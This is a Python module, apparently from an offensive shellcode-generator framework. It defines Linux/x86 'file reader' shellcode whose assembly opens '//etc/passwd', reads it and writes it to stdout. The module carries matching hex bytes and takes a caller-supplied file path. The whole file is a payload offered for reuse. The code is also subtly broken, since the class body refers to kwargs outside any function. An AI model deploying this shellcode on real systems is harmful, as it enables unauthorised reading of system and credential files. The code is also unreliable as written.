from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
	Shellcode.info["author"] = "B3mB4m"
	Shellcode.info["name"] = "Linux/x86 - file reader"
	Shellcode.info["references"] = [
		"https://www.exploit-db.com/exploits/37297/"
	]
	Shellcode.info["size"] = 43 + Shellcode.getsize(kwargs["file"])
	Shellcode.info["rawassembly"] = [
		"xor    %ecx,%ecx",
		"xor    %eax,%eax",
		"xor    %edx,%edx",
 		"push   %ecx",
		"mov    $0x5,%al",
		"push   $0x64777373",
		"push   $0x61702f63",
		"push   $0x74652f2f",
 		"mov    %esp,%ebx",
		"int    $0x80",
		"mov    %ebx,%ecx",
		"mov    %eax,%ebx",
		"mov    $0x3,%al",
		"mov    $0xfff,%dx",
		"inc    %dx",
		"int    $0x80",
		"xor    %eax,%eax",
		"xor    %ebx,%ebx",
		"mov    $0x1,%bl",
		"mov    $0x4,%al",
		"int    $0x80",
		"xor    %eax,%eax",
		"mov    $0x1,%al",
		"int    $0x80",
	]

	
	def __init__(self, **kwargs): 
		Shellcode.info["payload"] = [
			r"\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05"	
			+kwargs["file"]+
			r"\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0"
			r"\x03\x66\xba\xff\x0f\x66\x42\xcd\x80"
			r"\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd"
			r"\x80\x31\xc0\xb0\x01\xcd\x80"
		]
		


